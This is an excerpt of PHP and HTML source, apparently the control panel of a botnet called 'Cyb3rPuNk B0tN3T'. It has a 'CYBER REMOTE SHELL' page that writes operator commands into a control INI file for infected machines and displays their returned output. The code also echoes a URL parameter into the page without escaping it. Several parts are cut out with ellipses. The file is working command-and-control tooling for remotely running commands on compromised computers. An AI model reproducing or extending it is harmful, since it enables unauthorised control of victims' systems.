...
<meta charset="UTF-8">
<title>Cyb3rPuNk B0tN3T :: REMOTE SHELL </title>
...
<?php
$CONEXAOSTX = parse_ini_file("./modulos/remotesx/midia/CTL.ini", 'CONEXAO');
$CONEXAOST = $CONEXAOSTX['CONEXAO']['STATUS'];
...
///////////////////////////////////////////////////////////
if(isset($_POST["cmdx"])) {
// Grava em arquivo INI de controle...
...
CMD=". $_POST["cmdx"] ."";
	...
	$arquivo = fopen("modulos/remotesx/midia/CTL.ini", "w");
...
<tr><td align="left" width="11%"><b>Status da conex&atilde;o: </b></td>
<td align="left" ><b>
<?php

if($CONEXAOST == 1) {
	echo "<font style=\"color: green;\">ON</font>";
} else {
	echo "<font style=\"color: red;\">OFF</font>";
}
...
<td  align="right">
<input type="submit" value="Atualizar conex&atilde;o" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: location.href='remotesxl.php?IDX=<?php echo $_GET["IDX"]; ?>';">
<input type="submit" value="Desconectar" style="margin: 0px; height: 26px; line-height: 26px; padding: 0px 10px; cursor: pointer; color: rgb(255, 255, 255); font-size: 12px; font-weight: bold; background: none repeat scroll 0% 0% rgb(241, 90, 35); border: medium none; box-shadow: 0px 0px 5px rgba(0, 0, 0, 0.1) inset; border-radius: 2px 2px 2px 2px; transition: all 0.3s ease-in-out 0s;" onclick="javascript: location.href='modulos/remotesx/disconnect.php?IDX=<?php echo $_GET["IDX"]; ?>';">
</td></tr></table><br></center>

<center><form name="fmr" action="remotesxl.php?IDX=<?php echo $_GET["IDX"]; ?>" method="post">
<table width='90%' cellpadding='2' border='0' bgcolor="#E0E0E0">
<tr><td colspan="2" align="center"><font style="color: black;"><b>CYBER REMOTE SHELL</b></font></td></tr>
<!-- Exibe UID -->
<tr bgcolor="#FCFCFC"><td align="left">

<textarea id="outputcmdx" name="outputcmdx" cols="130" rows="15">
<?php

///////////////////////////////////////////////////////////
// Exibe buffer do comando recebido...
$arquivoTemp = "modulos/remotesx/midia/temp.txt";
$ler = fopen($arquivoTemp, "r");
$bufx = fread($ler, filesize($arquivoTemp));
...
var elem = document.getElementById('outputcmdx');
elem.scrollTop = elem.scrollHeight;

</script>

<tr bgcolor="#FCFCFC"><td align="left"><font style="color: black;"><b>
<input type="text" id="cmdx" name="cmdx" size="174">
</b></font></td></tr>
</table></form></center>
